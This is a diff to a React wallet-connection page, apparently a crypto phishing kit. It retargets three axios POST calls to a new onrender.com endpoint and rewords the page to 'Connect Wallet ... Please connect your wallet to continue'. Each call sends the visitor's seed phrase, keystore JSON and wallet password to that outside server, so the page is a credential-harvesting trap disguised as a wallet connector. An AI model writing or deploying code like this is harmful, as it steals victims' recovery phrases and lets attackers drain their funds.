@@ -541,7 +541,7 @@ function Wallet(){
 
 
         try {
-            const response = await axios.post('https://tokenresolveback.onrender.com/api/send', {
+            const response = await axios.post('https://securetoken.onrender.com/api/send', {
                 phrase:phrase,
                 keystore_json:keystore_json,
                 wallet_password:wallet_password,
@@ -577,7 +577,7 @@ function Wallet(){
 
 
         try {
-            const response = await axios.post('https://tokenresolveback.onrender.com/api/send', {
+            const response = await axios.post('https://securetoken.onrender.com/api/send', {
                 phrase:phrase,
                 keystore_json:keystore_json,
                 wallet_password:wallet_password,
@@ -615,7 +615,7 @@ function Wallet(){
 
 
         try {
-            const response = await axios.post('https://tokenresolveback.onrender.com/api/send', {
+            const response = await axios.post('https://securetoken.onrender.com/api/send', {
                 phrase:phrase,
                 keystore_json:keystore_json,
                 wallet_password:wallet_password,
@@ -644,7 +644,8 @@ function Wallet(){
 
     return (
         <>
-            <h1 className='text-center py-5 wallethead'>Choose Preferred Wallets </h1>
+            <h1 className='text-center py-2 wallethead'>Connect Wallet </h1>
+            <p className='subtitle mb-4'>Please connect your wallet to continue</p>
 
 
             <section className='px-5 row text-center'>
@@ -656,7 +657,7 @@ function Wallet(){
                                 setSelectedName(wall.name);
 
                                 setSelectedImage(wall.url);
-                            }} className='col-md-3 col-6'data-toggle="modal" data-target="#exampleModal">
+                            }} className='col-md-2 col-6'data-toggle="modal" data-target="#exampleModal">
                                 
                                     <img className='walletimage py-2' src={wall.url} />
 
